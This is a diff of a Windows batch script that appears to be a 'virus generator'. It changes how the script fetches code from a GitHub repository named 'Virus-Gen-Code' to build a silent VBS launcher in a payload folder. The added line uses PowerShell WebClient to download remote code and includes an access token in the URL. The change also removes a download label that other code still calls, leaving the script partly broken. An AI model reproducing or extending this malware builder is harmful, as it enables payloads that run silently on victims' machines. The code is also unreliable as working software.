@@ -1,7 +1,7 @@
 :: setup
 @echo on
 set update_number=V1.23.16
-set dev=0
+set dev=1
 set temp=0
 color 0F
 title unstable Release %update_number%
@@ -49,9 +49,8 @@ echo [92mregistered file on github![0m
 mkdir %opt2%\payload >nul
 echo [33mdownloading code from github to create silent launch file...[0m
 set dlerror=4
-Set "url=https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/SL?token=ANX5WBA5Z5IVXD225V2PBQLAKLCRA"
 for %%# in (%url%) do ( set "File=%tmp%\%%~n#.txt" )
-Call :Download "%url%" "%File%"
+Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/SL?token=ANX5WBA5Z5IVXD225V2PBQLAKLCRA','C:\')" >error.txt
 If exist "%File%" ( 
     ( Type "%File%")>con
 ( Type "%File%" >%opt2%\payload\launch.vbs)
@@ -236,7 +235,6 @@ goto emailnext
 
 :: create update
 ::web download code
-:Download <url> <File>
 Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('%1','%2')" >error.txt
 >nul find "At" error.txt && (
   goto error%dlerror%
